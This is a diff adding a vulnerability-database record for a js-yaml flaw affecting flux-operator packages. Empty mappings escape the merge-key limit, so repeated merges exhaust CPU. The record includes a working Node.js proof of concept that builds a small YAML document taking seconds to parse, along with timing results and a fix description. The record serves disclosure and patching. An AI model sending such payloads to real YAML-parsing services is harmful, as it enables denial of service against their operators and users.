@@ -1,0 +1,153 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-chqz-onqi-ecrd-dz47",
+  "modified": "2026-11-14T15:10:51Z",
+  "published": "2026-11-14T15:10:51Z",
+  "upstream": [
+    "GHSA-r3ph-w7gj-g6xm"
+  ],
+  "summary": "## Summary",
+  "details": "## Summary\n\n`maxTotalMergeKeys` does not count empty mappings. An attacker can repeatedly merge a large sequence of them and consume significant CPU without reaching the configured limit.\n\n## Example\n\n```yaml\narr: &arr [{}, {}, {}, ...] # N empty mappings\ntargets:\n  - <<: *arr                # repeated K times\n```\n\nFor every target, the loader iterates all `N` elements of `arr`. This results in `O(N * K)` work while `totalMergeKeys` remains unchanged.\n\n## PoC\n\n```js\nimport { performance } from 'node:perf_hooks'\nimport { load, YAML11_SCHEMA } from 'js-yaml'\n\nconst n = 20000\n\nconst src =\n  'arr: &arr [' + '{},'.repeat(n).slice(0, -1) + ']\\n' +\n  'targets:\\n' +\n  '  - <<: *arr\\n'.repeat(n)\n\nconst started = performance.now()\n\nload(src, { schema: YAML11_SCHEMA })\n\nconsole.log(`${(performance.now() - started).toFixed(1)} ms`)\n```\n\nObserved results:\n\n| N | YAML size | Time |\n|---:|---:|---:|\n| 800 | ~13 KB | ~20 ms |\n| 3200 | ~50 KB | ~180 ms |\n| 20000 | ~500 KB | ~13 s |\n\n## Impact\n\nWhen merge keys are enabled, an attacker can submit a relatively small YAML document that causes prolonged CPU consumption despite the default `maxTotalMergeKeys` limit.\n\n## Fix\n\nCount every merge source mapping as one budget unit in addition to counting its keys.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "flux-operator-dev",
+        "purl": "pkg:apk/dhi/flux-operator-dev"
+      },
+      "versions": [
+        "0.57.0-r0",
+        "0.58.1-r0",
+        "0.58.1-r1",
+        "0.59.0-r0",
+        "0.59.0-r1",
+        "0.60.0-r0",
+        "0.60.0-r1",
+        "0.61.0-r0",
+        "0.61.0-r1",
+        "0.61.0-r2",
+        "0.61.0-r3",
+        "0.62.1-r0",
+        "0.62.1-r1",
+        "0.62.1-r2",
+        "0.62.1-r3",
+        "0.62.1-r4"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "flux-operator-fips-dev",
+        "purl": "pkg:apk/dhi/flux-operator-fips-dev"
+      },
+      "versions": [
+        "0.57.0-r0",
+        "0.58.1-r0",
+        "0.58.1-r1",
+        "0.59.0-r0",
+        "0.59.0-r1",
+        "0.60.0-r0",
+        "0.60.0-r1",
+        "0.61.0-r0",
+        "0.61.0-r1",
+        "0.61.0-r2",
+        "0.61.0-r3",
+        "0.62.1-r0",
+        "0.62.1-r1",
+        "0.62.1-r2",
+        "0.62.1-r3",
+        "0.62.1-r4"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "flux-operator-fips",
+        "purl": "pkg:apk/dhi/flux-operator-fips"
+      },
+      "versions": [
+        "0.57.0-r0",
+        "0.58.1-r0",
+        "0.58.1-r1",
+        "0.59.0-r0",
+        "0.59.0-r1",
+        "0.60.0-r0",
+        "0.60.0-r1",
+        "0.61.0-r0",
+        "0.61.0-r1",
+        "0.61.0-r2",
+        "0.61.0-r3",
+        "0.62.1-r0",
+        "0.62.1-r1",
+        "0.62.1-r2",
+        "0.62.1-r3",
+        "0.62.1-r4"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "flux-operator",
+        "purl": "pkg:apk/dhi/flux-operator"
+      },
+      "versions": [
+        "0.57.0-r0",
+        "0.58.1-r0",
+        "0.58.1-r1",
+        "0.59.0-r0",
+        "0.59.0-r1",
+        "0.60.0-r0",
+        "0.60.0-r1",
+        "0.61.0-r0",
+        "0.61.0-r1",
+        "0.61.0-r2",
+        "0.61.0-r3",
+        "0.62.1-r0",
+        "0.62.1-r1",
+        "0.62.1-r2",
+        "0.62.1-r3",
+        "0.62.1-r4"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-chqz-onqi-ecrd-dz47"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-r3ph-w7gj-g6xm"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-r3ph-w7gj-g6xm"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/nodeca/js-yaml/commit/6a8e05f9a485188ed730ac81e81ae221352ef480"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nodeca/js-yaml/releases/tag/5.4.1"
+    }
+  ]
+}
